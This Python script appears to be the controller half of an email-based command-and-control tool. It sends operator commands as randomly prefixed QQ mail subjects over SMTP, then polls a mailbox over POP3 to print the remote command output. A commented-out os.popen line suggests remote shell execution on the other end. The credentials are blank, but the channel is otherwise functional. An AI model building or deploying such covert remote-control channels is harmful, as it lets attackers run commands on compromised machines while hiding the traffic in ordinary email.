#coding:utf-8
import os
import smtplib
from email.mime.text import MIMEText
from email.header import Header
import poplib
from email.parser import Parser
from email.header import decode_header
import time
import random

"""控制端"""

"""生成随机值"""
def random_str():
    data = "123456789zxcvbnmasdfghjklqwertyuiop"
    random.seed(time.time())
    sa = []
    for i in range(6):
        sa.append(random.choice(data))
        random_s = "jinny_" + "".join(sa)
    return random_s

"""发送"""
def send(title):
    sender = "smtp.qq.com"                         #邮件服务器地址
    sender_mail_pass = ""          #qq邮件的授权码
    sender_mail = ""             #发送者qq邮箱地址
    receiver_mail = [""]          #接受者qq邮箱地址
    conent = "test"
    message = MIMEText(conent,'plain','utf-8')
    message['From'] = Header("槿",'utf-8')
    random_s = random_str()
    message['To'] = Header(random_s,'utf-8')
    subjetc = random_s + title                      #发送内容
    message['Subject'] = Header(subjetc,'utf-8')
    try:
        smtpObj = smtplib.SMTP_SSL(sender,465)
        smtpObj.login(sender_mail,sender_mail_pass)
        smtpObj.sendmail(sender_mail,receiver_mail,message.as_string())
        smtpObj.quit()
    except:
        print("发送失败")



"""接收"""
# indent用于缩进显示:
def receive(indent=0):
    email = ""                 #接收者qq邮箱地址
    passwd = ""                  #接收者qq邮箱授权码
    pop3_server = "pop.qq.com"                   #邮件服务器地址

    server = poplib.POP3(pop3_server)
    #server.set_debuglevel(1)
    # print(server.getwelcome().decode('utf-8'))

    server.user(email)
    server.pass_(passwd)
    # print(server.stat())

    resp, mails, octets = server.list()
    index = len(mails)
    resp, lines, octets = server.retr(index)
    content = b'\r\n'.join(lines).decode('utf-8')
    msg = Parser().parsestr(content)
    # print(msg)
    if indent == 0:
        value = msg.get("Subject")
        value = decode_str(value)
        return value

"""解码"""
def decode_str(s):
    value, charset = decode_header(s)[0]
    if charset:
        value = value.decode(charset)
    return value



def main():
    while (True):
        get = input()
        if get == "exit":
            break
        #content = os.popen(get).read()
        #print(content)exit
        title = get
        #print(title)
        send(title)
        time.sleep(5)
        result = receive()
        print(result[12:])


if __name__ == '__main__':
    main()